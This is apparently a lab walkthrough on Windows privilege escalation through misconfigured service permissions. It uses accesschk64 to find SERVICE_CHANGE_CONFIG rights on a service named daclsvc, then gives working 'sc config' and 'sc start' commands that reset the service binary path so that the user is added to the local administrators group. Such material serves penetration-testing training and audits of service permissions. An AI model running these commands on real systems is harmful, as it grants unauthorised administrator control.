# Escalation Path Service Permissions

## Binary - Path

### Binary Path in Windows Services

A **binary path** (`binpath`) in Windows services defines the **executable file** that runs when the service starts. This path is stored in the **Windows Registry** and tells the system what to execute when a service is launched.

### How is it Exploited for Privilege Escalation?

If a user has **SERVICE_CHANGE_CONFIG** permissions on a service, they can **modify the binary path** and point it to a **malicious command or executable**. When the service is restarted, Windows will execute the new binary **with system-level privileges**.

### Detection

**Windows VM**

```
accesschk64.exe
```

Open command prompt and type: 

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```

Notice that the output suggests that the user “`User-PC\User`” has the “`SERVICE_CHANGE_CONFIG`” permission.

### Exploitation

**Windows VM**

In command prompt type:

```
sc config daclsvc binpath= "net localgroup administrators user /add" 
``` 

In command prompt type: 

```
sc start daclsvc
```

It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt:

```
net localgroup administrators
```





